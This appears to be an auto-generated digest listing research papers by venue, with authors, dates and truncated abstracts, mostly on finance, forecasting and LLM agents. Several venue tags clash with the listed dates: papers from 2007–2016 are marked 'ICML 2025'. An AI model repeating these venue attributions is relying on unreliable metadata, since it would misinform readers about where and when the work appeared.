  - *Yiyang Bian, Min Cheng, Chen Yang et al.*
  - **ICML 2025** · OpenReview · `2016-01-01`
  - With the rapid development of online and offline transactions, various financial fraud crimes happen every day. Financial fraud has seriously affected the health of economics and damaged the welfare of consumers, investors, as well as financial institutions. Prior studies apply s…

- **[Portfolio approaches for constraint optimization problems](https://openreview.net/forum?id=j3FK0IgKQi)**
  - *Roberto Amadini, Maurizio Gabbrielli, Jacopo Mauro*
  - **ICML 2025** · OpenReview · `2016-01-01`
  - Within the Constraint Satisfaction Problems (CSP) context, a methodology that has proven to be particularly performant consists of using a portfolio of different constraint solvers. Nevertheless, comparatively few studies and investigations have been done in the world of Constrai…

- **[Portfolio Methods for Optimal Planning: An Empirical Analysis](https://openreview.net/forum?id=475019BUk2)**
  - *Mattia Rizzini, Chris Fawcett, Mauro Vallati et al.*
  - **ICML 2025** · OpenReview · `2015-01-01`
  - Combining the complementary strengths of several algorithms through portfolio approaches has been demonstrated to be effective in solving a wide range of AI problems. Notably, portfolio techniques have been prominently applied to suboptimal (satisficing) AI planning. Here, we con…

- **[Portfolio performance and risk-based assessment of the PORTRAIT tool](https://openreview.net/forum?id=nePDRDlqmL)**
  - *Konstantina Pendaraki, Nikolaos I. Spanoudakis*
  - **ICML 2025** · OpenReview · `2015-01-01`
  - In this paper we evaluate and extend the PORTRAIT tool. PORTRAIT applies an argumentation based methodology for composing fund portfolios. Argumentation allows for combining different contexts and preferences in a way that can be optimized. It allows for defining a set of differe…

- **[Portfolio Methods in Uncertain Contexts. (Méthodes de portefeuille en contexte incertain)](https://openreview.net/forum?id=UOZdaO3HdK)**
  - *Jialin Liu*
  - **ICML 2025** · OpenReview · `2015-01-01`
  - en fr This manuscript concentrates in studying methods to handle the noise, including using resampling methods to improve the convergence rates and applying portfolio methods to cases with uncertainties (games, and noisy optimization in continuous domains).Part I will introduce t…

- **[Financial Market Prediction Based On Online Opinion Ensemble](https://openreview.net/forum?id=GfwxqxCXjR)**
  - *Wei Xu, Daoyuan Sun, Zihe Meng et al.*
  - **ICML 2025** · OpenReview · `2012-01-01`
  - Financial market prediction is one of the most attractive research areas in financial data mining field because of its available data and potential profits. Financial market prediction has been paid much attention by many researchers and practitioners. Huge numbers of forecasting…

- **[Trading Agents](https://openreview.net/forum?id=8QTqyKAeeN)**
  - *Michael P. Wellman*
  - **ICML 2025** · OpenReview · `2011-01-01`
  - Automated trading in electronic markets is one of the most common and consequential applications of autonomous software agents.

- **[Financial supply chain management](https://openreview.net/forum?id=qNRO4hqcog)**
  - *Miao He, Changrui Ren, Bing Shao et al.*
  - **ICML 2025** · OpenReview · `2010-01-01`
  - To effectively manage a supply chain, we should no longer focus on physical flow and informational flow only, but also the financial flow. The financial supply chain management (FSCM) extracts capital tied to the raw material, work-in-process, inventory in transit, and accounts r…

- **[Financial Forecasting with Gompertz Multiple Kernel Learning](https://openreview.net/forum?id=61F5yY82AP)**
  - *Han Qin, Dejing Dou, Yue Fang*
  - **ICML 2025** · OpenReview · `2010-01-01`
  - Financial forecasting is the basis for budgeting activities and estimating future financing needs. Applying machine learning and data mining models to financial forecasting is both effective and efficient. Among different kinds of machine learning models, kernel methods are well…

- **[Portfolio optimization for wealth-dependent risk preferences](https://openreview.net/forum?id=a9ZZOydRP9)**
  - *Luis Miguel Rios, Nikolaos V. Sahinidis*
  - **ICML 2025** · OpenReview · `2010-01-01`
  - Empirical and theoretical studies of preference structures of investors have long shown that personal and corporate utility is typically multimodal, implying that the same investor can be risk-averse at certain levels of wealth while risk-seeking at others. In this paper, we cons…

- **[Portfolio construction using argumentation and hybrid evolutionary forecasting algorithms](https://openreview.net/forum?id=Q76JVm1o5n)**
  - *Nikolaos I. Spanoudakis, Konstantina Pendaraki, Grigorios N. Beligiannis*
  - **ICML 2025** · OpenReview · `2009-01-01`
  - In the current contribution, an application for constructing mutual fund portfolios is presented. This approach comprises several Intelligent Methods, namely an argumentation based decision making framework and a hybrid evolutionary forecasting algorithm which combines Genetic Al…

- **[Resource-Bounded Fraud Detection](https://openreview.net/forum?id=dOUXFZ9lCD)**
  - *Luís Torgo*
  - **ICML 2025** · OpenReview · `2007-01-01`
  - This paper describes an approach to fraud detection targeted at applications where this task is followed by a posterior human analysis of the signaled frauds. This is a frequent setup on fraud detection applications (e.g. credit card misuse, telecom fraud, etc.). In real world ap…

- **[MAS-GPT: Training LLMs to Build LLM-based Multi-Agent Systems](https://arxiv.org/abs/2503.03686)**
  - *Rui Ye, Shuo Tang, Rui Ge et al.*
  - **ICML 2025** · `2025-03-05`
  - LLM-based multi-agent systems (MAS) have shown significant potential in tackling diverse tasks. However, to design effective MAS, existing approaches heavily rely on manual configurations or multiple calls of advanced LLMs, resulting in inadaptability and high inference costs. In…

- **[MedRAX: Medical Reasoning Agent for Chest X-ray](https://arxiv.org/abs/2502.02673)**
  - *Adibvafa Fallahpour, Jun Ma, Alif Munim et al.*
  - **ICML 2025** · `2025-02-04`
  - Chest X-rays (CXRs) play an integral role in driving critical decisions in disease management and patient care. While recent innovations have led to specialized models for various CXR interpretation tasks, these solutions often operate in isolation, limiting their practical utili…


### ICLR

- **[RedCodeAgent: Automatic Red-teaming Agent against Diverse Code Agents](https://arxiv.org/abs/2510.02609)**
  - *Cheng-Quan Guo, Chulin Xie, Yu Yang et al.*
  - **ICLR 2025** · `2025-10-02`
  - Code agents have gained widespread adoption due to their strong code generation capabilities and integration with code interpreters, enabling dynamic execution, debugging, and interactive programming capabilities. While these advancements have streamlined complex workflows, they…


### KDD

- **[Agent-Diff: Benchmarking LLM Agents on Enterprise API Tasks via Code Execution with State-Diff-Based Evaluation](https://arxiv.org/abs/2602.11224)**
  - *Hubert M. Pysklo, A. Zhuravel, Patrick Watson*
  - **KDD 2026** · `2026-02-11`
  - We present Agent-Diff, a novel benchmarking framework for evaluating agentic Large Language Models (LLMs) on real-world productivity software API tasks via code execution. Agentic LLM performance varies due to differences in models, external tool access, prompt structures, and ag…

- **[IVMR suite: An Industrial-scale Virtual Machine Rescheduling Dataset and Benchmark for Elastic Cloud Service](https://dl.acm.org/doi/pdf/10.1145/3711896.3737381)**
  - *Yupeng Zhang, Xu Wan, Xiang-Yun Kong et al.*
  - **KDD 2025** · `2025-08-03`
  - Virtual Machine Rescheduling (VMR) plays a crucial role in maintaining service quality and resource efficiency in elastic cloud computing. However, existing datasets and benchmarks primarily focus on VM scheduling tasks, while lacking industrial-scale datasets and standardized ev…


### ACL

- **[AfriSpeech-MultiBench: A Verticalized Multidomain Multicountry Benchmark Suite for African Accented English ASR](https://arxiv.org/abs/2511.14255)**
  - *Gabrial Zencha Ashungafac, M. Sanni, Busayo Awobade et al.*
  - **ACL 2025** · `2025-11-18`
  - Recent advances in speech-enabled AI, including Google's NotebookLM and OpenAI's speech-to-speech API, are driving widespread interest in voice interfaces globally. Despite this momentum, there exists no publicly available application-specific model evaluation that caters to Afri…

- **[SecureWebArena: A Holistic Security Evaluation Benchmark for LVLM-based Web Agents](https://arxiv.org/abs/2510.10073)**
  - *Zong-Hao Ying, Yang-Guang Shao, Jian-Le Gan et al.*
  - **ACL 2025** · `2025-10-11`
  - Large vision-language model (LVLM)-based web agents are emerging as powerful tools for automating complex online tasks. However, when deployed in real-world environments, they face serious security risks, motivating the design of security evaluation benchmarks. Existing benchmark…

- **[Beyond N-Grams: Rethinking Evaluation Metrics and Strategies for Multilingual Abstractive Summarization](https://arxiv.org/abs/2507.08342)**
  - *Itai Mondshine, Tzuf Paz-Argaman, Reut Tsarfaty*
  - **ACL 2025** · `2025-07-10`
  - Automatic n-gram based metrics such as ROUGE are widely used for evaluating generative tasks such as summarization. While these metrics are considered indicative (even if imperfect) of human evaluation for English, their suitability for other languages remains unclear. To address…

- **[METAL: A Multi-Agent Framework for Chart Generation with Test-Time Scaling](https://arxiv.org/abs/2502.17651)**
  - *Bing-Xuan Li, Yi-Wei Wang, Jiu-Xiang Gu et al.*
  - **ACL 2025** · `2025-02-24`
  - Chart generation aims to generate code to produce charts satisfying the desired visual properties, e.g., texts, layout, color, and type. It has great potential to empower the automatic professional report generation in financial analysis, research presentation, education, and hea…

- **[G-Safeguard: A Topology-Guided Security Lens and Treatment on LLM-based Multi-agent Systems](https://arxiv.org/abs/2502.11127)**
  - *Shilong Wang, Gui-Min Zhang, Miao Yu et al.*
  - **ACL 2025** · `2025-02-16`
  - Large Language Model (LLM)-based Multi-agent Systems (MAS) have demonstrated remarkable capabilities in various complex tasks, ranging from collaborative problem-solving to autonomous decision-making. However, as these systems become increasingly integrated into critical applicat…


### Other / arXiv

- **[Cortex-FL: Agent-Mediated Collaboration for Federated Learning](https://arxiv.org/abs/2611.17186v1)**
  - *Rui Sun, Jinfeng Peng, Zehua Cheng et al.*
  - `2026-11-12`
  - Federated learning (FL) enables independent data owners to train models collaboratively without centralizing raw data. However, identifying collaborators, preparing training tasks, and coordinating execution and incentives hinder its practical adoption by organizations without sp…

- **[AI for Biologists: The Knowledge Boundaries of Foundation Models in the Age of Agentic Systems](https://arxiv.org/abs/2611.17015v1)**
  - *Tian Cai, Andrew Kleist, Jaimin Patel et al.*
  - `2026-11-12`
  - Artificial intelligence (AI) is changing how biological research is done. Biological foundation models trained on millions of nucleotides, protein, and single-cell measurements predict protein structures, mutation effects, and cellular responses to genetic perturbations. Agentic…

- **[From Data to Wisdom: Rethinking AI Through an Epistemic Lens](https://arxiv.org/abs/2611.16726v1)**
  - *Afonso Eduardo*
  - `2026-11-12`
  - This paper proposes the Data-to-Wisdom Epistemic Architecture for AI (EAAI), a conceptual framework treating Data, Information, Knowledge, Understanding and Wisdom as five distinct but recursively interacting epistemic functions: observation, contextual interpretation, modeling a…

- **[Time and Space: A Dual-Axis, Evidence-Grounded Context Substrate for Personal Agents](https://arxiv.org/abs/2611.16492v1)**
  - *Haitao Cheng, Jerry Hu, Longdong Mao et al.*
  - `2026-11-12`
  - We argue that a binding constraint for personal agents is not model capacity but the form in which context is represented: the agent does not know which entity a phrase denotes, when a fact held, or which source record licenses a claim. We call the missing representation spatio-t…

- **[Internalizing Investment Mandates: A Neurosymbolic RL Approach to Portfolio Allocation](https://arxiv.org/abs/2611.17329v1)**
  - *Zeynep Yıldız, Satchit Chatterji, Ercan Atam et al.*
  - `2026-11-12`
  - Institutional portfolios operate under investment policy statements that specify asset allocation constraints, often conditioned on market regime information. Deep reinforcement learning has been shown to optimize financial performance but typically does not enforce rule complian…

- **[Outcome-Mass Alignment: Controlling Length-Dependent Trajectory Influence in Multi-Turn LLM Agent Reinforcement Learning](https://arxiv.org/abs/2611.16816v1)**
  - *Dawei Zhang, Yubin Huangfu, Jessica Fan et al.*
  - `2026-11-12`
  - To keep long interaction contexts tractable, stepwise group-relative training for multi-turn LLM agents materializes each source trajectory into multiple response rows and valid tokens. This expansion creates an outer-accounting problem distinct from within-trajectory credit assi…

- **[Reasoning Supervision and Capability Retention in LoRA Domain Adaptation](https://arxiv.org/abs/2611.17072v1)**
  - *Saleh Ashkboos, Dhruv Desai, Lavinia Ghita*
  - `2026-11-12`
  - Fine-tuning foundation models on financial data has a wide range of applications, including identifying event types from news, monitoring risk and compliance language, and answering questions over filings and earnings calls. In this setting, the main challenge is to improve task…

- **[Causals: An Open Knowledge Graph for Research on Causal Reasoning](https://arxiv.org/abs/2611.16267v1)**
  - *Miaozhe Lin, Qiongzheng Lin, Zhongwei Liang et al.*
  - `2026-11-12`
  - Applying causal knowledge to a new event requires connecting the event to relevant entities and the relationships through which its consequences may unfold. We present Causals, an open knowledge graph for research on this form of reasoning. Its initial release, constructed from n…

- **[TAPES: Terminal Adjoint-Propagated Error Scheduling for Financial Diffusion Samplers](https://arxiv.org/abs/2611.16484v1)**
  - *Yilie Huang*
  - `2026-11-12`
  - Financial diffusion samplers are often reused with a small number of function evaluations (NFE) inside scenario and risk pipelines, where numerical time-grid error can distort terminal quantities such as covariances, tails, and drawdown proxies. We study offline grid construction…

- **[Improving Algorithmic Trading for BESS on Intraday Electricity Markets through Distributional Price Forecasts](https://arxiv.org/abs/2611.17170v1)**
  - *Simon Hirsch, David Schaurecker, David Wozabal*
  - `2026-11-12`
  - Grid-scale battery energy storage systems (BESS) are becoming increasingly important in short-term energy markets, where they help balance fluctuations in variable renewable generation. In many countries, the continuous intraday market is the most important wholesale market for B…

- **[Verifiable Settlement and Pricing for Local Energy Markets: Architecture and Deployment on Hyperledger Besu](https://arxiv.org/abs/2611.16495v1)**
  - *Michele Fabi, Baptiste Leloup*
  - `2026-11-12`
  - We implement privacy-preserving local electricity exchanges using an automated market maker on the Hyperledger Besu network under QBFT consensus. The proposed protocol operator collects individual electricity positions off-chain and publishes aggregate supply and demand on the bl…

- **[Beyond Binary Classification: Multiclass Machine Learning for Diabetes and Prediabetes Risk Prediction Using NHANES](https://arxiv.org/abs/2611.16756v1)**
  - *Aman Mujahid, Anita Penkova*
  - `2026-11-12`
  - Detecting diabetes risk early is important for preventing disease progression. Most existing machine learning approaches focus on binary classification, which limits their ability to capture intermediate risk states such as prediabetes. We develop a supervised learning framework…

- **[Dynamic Scenario-Based Portfolio Optimization for Multi-Asset ETFs](https://arxiv.org/abs/2611.16540v1)**
  - *Abigail A. Mensah, Ali M. Jaffri, Nicholas Appiah W. Brent Lindquist et al.*
  - `2026-11-12`
  - Portfolio outcomes may depend as much on trading restrictions as on how returns are modeled. We compared historical moving-window returns with conditional scenarios from ARMA--GARCH models and a Student-$t$ copula for 30 U.S.-listed exchange-traded funds. Matched mean--variance a…

- **[SkillEarth: Teaching General-Purpose Agents to Act on Earth via Skill Evolution](https://arxiv.org/abs/2611.15481v1)**
  - *Haojun Tang, Wenda Zhao, Xiang Zhou et al.*
  - `2026-11-11`
  - Recently developed remote sensing (RS) agents execute real-world tasks with complex workflows through multi-step tool invocation. These agents, however, typically rely on predefined expertise or parameter updates. They thus require updating expert knowledge or retraining models w…

- **[Understanding the Effects of Multi-Agent Deliberation for Human-AI Decision-Making](https://arxiv.org/abs/2611.14901v1)**
  - *Harry Yizhou Tian, Ming Yin*
  - `2026-11-11`
  - Multi-agent deliberation (MAD), where multiple LLMs engage in structured discussion, improves AI performance on many benchmarks, but whether it helps humans make better decisions remains untested. We conduct two user studies on LLM-response-verification and fact-checking. We firs…

- **[Can Agents Relive Past Experiences? Diagnosing Event-Affect Decoupling in Affective-Episodic Retrospection](https://arxiv.org/abs/2611.15655v1)**
  - *Tingna Xie, Ming Wang, Shi Feng et al.*
  - `2026-11-11`
  - As memory-augmented agents increasingly support long-term and personalized interactions, reliable recall of emotional experiences while preserving their associated affect becomes necessary. However, existing evaluations usually assess emotion accuracy and factual memory grounding…

- **[GHA-SmellFix: Taking Action with Agentic LLMs for Detecting and Refactoring GitHub Actions Workflow Smells](https://arxiv.org/abs/2611.14963v1)**
  - *Anderson Uchôa, Jhefferson Souza, Emanuel Ávila et al.*
  - `2026-11-11`
  - Continuous integration and continuous delivery workflows are key artifacts in software projects. In GitHub Actions, they encode build, test, release, deployment, and security automation in YAML. These workflows contain configuration smells affecting security, reliability, maintai…

- **[Quantum Recurrent Architectures for Financial Time Series Prediction](https://arxiv.org/abs/2611.15298v1)**
  - *Danyal Maheshwari, Gerhard Hellstern, Martin Zaefferer et al.*
  - `2026-11-11`
  - This study evaluates quantum classical hybrid recurrent architectures for financial time-series forecasting: a Quantum Long Short-Term Memory (QLSTM) network and Quantum Reservoir Computing (QRC) with lag-based inputs. Classical lag vectors are encoded into quantum states via amp…

- **[Idiosyncratic Market Effects in Global Time Series Momentum](https://arxiv.org/abs/2611.15646v1)**
  - *Andrew Butler, Maciej Zawadzki, Adam Butler*
  - `2026-11-11`
  - Time series momentum is a pervasive explanatory factor in financial markets whereby a market's recent historical average return positively predicts future returns. Recent applications of statistical learning augment the traditional linear model definition with a more descriptive…

- **[Parsimonious and Flexible Parameterizations for Realized Covariance Matrix Models](https://arxiv.org/abs/2611.15619v1)**
  - *Edoardo Otranto*
  - `2026-11-11`
  - Covariance models describe the dynamics of conditional covariance matrices as functions of past variances and covariances and are widely used to model the joint evolution of financial asset returns. Their specification faces two major challenges: the curse of dimensionality, wher…

- **[Global Seasonality Factor Investing](https://arxiv.org/abs/2611.15657v1)**
  - *Andrew Butler, Adam Butler, Maciej Zawadzki*
  - `2026-11-11`
  - We study seasonality as a factor for predicting risk-adjusted returns across global futures markets. We document five seasonality anomalies that, in aggregate, are pervasive across bond, commodity and equity markets. We demonstrate that each seasonality factor produces excess ret…

- **[Least Expensive Standard Pensions](https://arxiv.org/abs/2611.15211v1)**
  - *Eckhard Platen*
  - `2026-11-11`
  - The paper proposes generating annuity payment streams at far lower costs than those implied by traditional theories. For a given investment universe, this enables the design of a least expensive standard pension, providing accurate monthly payments of savings account units over a…

- **[Large Payments Model](https://arxiv.org/abs/2611.15814v1)**
  - *Natraj Raman, Abhenandhan Manoharan, Vishwasreddy Thuniki et al.*
  - `2026-11-11`
  - Payment applications such as fraud detection, authorization prediction, and payment optimization draw on overlapping transaction information. This motivates a reusable payments intelligence layer that shares learned representations and predictive signals, rather than developing p…

- **[SynthCorp: A Platform for Creating Benchmarks for Data Agents](https://arxiv.org/abs/2611.14765v1)**
  - *Jiani Zhang, Manav Garg, Eugenie Lai et al.*
  - `2026-11-10`
  - Current benchmarks for LLM-driven data agents saturate quickly and cannot target specific capabilities. We present SynthCorp, a platform that creates customizable data estates and benchmarks by simulating how business events produce and modify corporate data over time. Each data…

- **[TreeAgent: Structure-Aware Memory Agent for Processing Long Hierarchical Data](https://arxiv.org/abs/2611.13946v1)**
  - *Wei Gu, Weiwei Qi, Jiajun Tang et al.*
  - `2026-11-10`
  - Practical Web applications increasingly require agents to interpret long conversations or documents. For inputs exceeding the context windows of large language models (LLMs), memory agents process segments sequentially and retain past information in bounded memory. However, they…

- **[A computational framework for understanding embodied plans](https://arxiv.org/abs/2611.13669v1)**
  - *Aalap D. Shah, Basil Saeed, Joshua B. Tenenbaum et al.*
  - `2026-11-10`
  - Reasoning about people's plans and goals based on their actions is fundamental to human social interaction and essential for cooperative, embodied artificial intelligence. Formalizing this capacity in naturalistic, embodied settings has been a longstanding challenge. Here, we pre…

- **[Tree-Ising: Repairing Language Models with Bit-Level Ising Edits](https://arxiv.org/abs/2611.14210v1)**
  - *Hadi Salloum, Ammar Ali*
  - `2026-11-10`
  - Weight-space programming, introduced in recent MIT work by Takehi et al., enables a frontier LLM agent to read a network's weights and write a repair. Their GPT-6 Astra agent corrected the reasoning loops of Qwen3.5-0.8B without gradients, using 158 agent turns, 89.7 million toke…

- **[The RSI Tax: When Recursive Self-Improvement Is Not Worth the Cost](https://arxiv.org/abs/2611.13524v1)**
  - *Yitong Zhang, Ang Li, Yisen Wang*
  - `2026-11-10`
  - Recursive self-improvement (RSI) seeks to improve an agent using its own task experience. Its practical value depends on whether performance gains justify the full cost of self-improvement and task execution. We evaluate this trade-off on continual task streams, scoring each task…

- **[Probe What-If Worlds Before You Ship: Persona Simulation for Real-World Decision Making](https://arxiv.org/abs/2611.14700v1)**
  - *Julie Zhu, Jianheng Hou, Zhixu Silvia Tao et al.*
  - `2026-11-10`
  - User research and system testing reveal whether products and services meet user needs, yet recruiting specialized participants, designing controlled what-if comparisons, and repeating studies as designs evolve often bottleneck design iteration and data-driven decision-making. We…

- **[Earlybird: Predictive Streaming Speech Recognition in 29M Parameters](https://arxiv.org/abs/2611.14421v1)**
  - *Sahil Mahendrakar*
  - `2026-11-10`
  - Streaming speech recognizers output a word only after the speaker has finished it, typically 90-400 ms later. For a voice agent every millisecond counts: the sooner the words are outputted, the sooner the agent can start a search or plan its reply. We present Earlybird, a 29M-par…

- **[AVCC: Audio-Visual Conversation Corpus for Turn-Taking Prediction with a Human Benchmark](https://arxiv.org/abs/2611.13957v1)**
  - *Haotian Qi, Gabriel Skantze*
  - `2026-11-10`
  - } Predicting who will speak next, and when, is a prerequisite for conversational agents and social robots that take turns without waiting for silence. Multiparty next-speaker prediction (NSP) has been studied on corpora with per-speaker sensors, each with its own event definition…

- **[IFRS Compliance Verification: An Open Multi-LLM Benchmark and Content-Conditioned Ensemble Classifier](https://arxiv.org/abs/2611.13595v1)**
  - *Aghoghomena Akasukpe, Li Yang, Xinyao Zhou et al.*
  - `2026-11-10`
  - Verifying corporate financial disclosures against the International Financial Reporting Standards (IFRS) is a core auditing task in which experts cross-reference disclosures with hundreds of fine-grained regulatory paragraphs: a laborious, costly, and error-prone process that mot…

- **[Market-Conditioned JEPA: Learning from Unpredictable Market Shocks](https://arxiv.org/abs/2611.13572v1)**
  - *Yuqi Wang, Fengyuan Liu, Mukai Li et al.*
  - `2026-11-10`
  - Much of the variation in financial time series is driven by market-wide shocks that cannot be predicted from an asset's own history. Per-asset self-supervised learning treats this variation as irreducible noise. Under a latent factor model, we show that conditioning prediction on…

- **[Online-Adaptive Fuzzy Cognitive Maps for Neuro-symbolic Financial Forecasting](https://arxiv.org/abs/2611.13388v1)**
  - *Brandon Rodriguez, Abel Deulofeu, Olaoluwa Adigun*
  - `2026-11-10`
  - We present a neuro-symbolic framework that pairs online-adaptive Fuzzy Cognitive Maps (FCMs) with long short-term memory (LSTM) networks for financial forecasting. Financial markets exhibit regime shifts and nonlinear dynamics. Existing models often trade off one of these key pro…

- **[Tabular Foundation Models in Financial Predictions](https://arxiv.org/abs/2611.13550v1)**
  - *Ed deHaan, Allen H. Huang*
  - `2026-11-10`
  - This technical note introduces tabular foundation models (TFMs) to accounting research and evaluates their performance in one common benchmark task: predicting firms' next-year earnings changes. TFMs produce numeric predictions and learn in context, without post-release training…

- **[Deep Learning for Operator Maps in Optimal Liquidation](https://arxiv.org/abs/2611.14245v1)**
  - *Ryan Donnelly, Luca Galimberti, Brian Healy et al.*
  - `2026-11-10`
  - We analyze the solution map of a optimal execution problem in which price dynamics are subject to a general transient impact kernel. Given the structure of the optimal trading strategy derived by Abi Jaber and Neuman in \cite{https://doi.org/10.1111/mafi.12465}, we show that the…

- **[Blurring the Block Boundaries: Overlapping Block Denoising for Efficient Diffusion Language Models](https://arxiv.org/abs/2611.14387v1)**
  - *Amir Mann, Jonathan Fhima, Shaked Brody et al.*
  - `2026-11-10`
  - Diffusion Language Models (DLMs) have emerged as effective alternatives to autoregressive models for latency-critical tasks, enabling faster token generation. Recent advances employ block diffusion with self-editing capabilities, where each block refines tokens iteratively before…

- **[Finite-Cadence Refresh Equilibria for Streaming Prior-Anchored Ridge: A Closed-Form Forgetting Window and Spectral Correction](https://arxiv.org/abs/2611.14586v1)**
  - *Mrigank Shekhar Singh*
  - `2026-11-10`
  - Recursive estimators on drifting streams must forget stale data fast enough to track the target, yet slowly enough to average out noise. In prior-anchored ridge regression, this trade-off admits a closed-form spectral decomposition in which each eigen-direction interpolates betwe…

- **[Conformal Risk Certificates for Portfolio Optimization Under Uncertainty: A Gated Reinforcement-Learning Approach](https://arxiv.org/abs/2611.14699v1)**
  - *Mohammad Zarei, Amirhossein MohammadpourAzari, Moslem Habibi*
  - `2026-11-10`
  - Reinforcement-learning portfolio policies can optimize allocations from prices, covariances, and prior positions, yet they lack a calibrated, replayable mechanism for certifying that a proposed allocation respects a bounded risk envelope before execution. Regulators increasingly…

- **[Optimal Trading Speed on Blockchain](https://arxiv.org/abs/2611.13616v2)**
  - *Ruizhe Jia, Shihao Yu*
  - `2026-11-10`
  - On blockchain-based exchanges, faster blocks weaken the priority-fee competition among arbitrageurs and shift rents from the block producer to them. Equilibrium liquidity peaks at an interior block speed; beyond a threshold, an active liquidity provider cream-skims and passive ca…

- **[Developing an Operational Model for an Internet of Data Based Trusted Data Space for Vocational Education](https://arxiv.org/abs/2611.13520v1)**
  - *Yalan Dong, Hao Tian, Hongyang Jia et al.*
  - `2026-11-10`
  - Data circulation in vocational education has long been constrained by unclear ownership, a lack of trust, and insufficient incentives. The Internet of Data provides a new underlying technology for enabling trusted cross-domain data circulation. Building on an Internet of Data bas…


---
*Generated 2026-11-13 · Sources: HuggingFace Daily Papers, OpenReview, Semantic Scholar, arXiv*
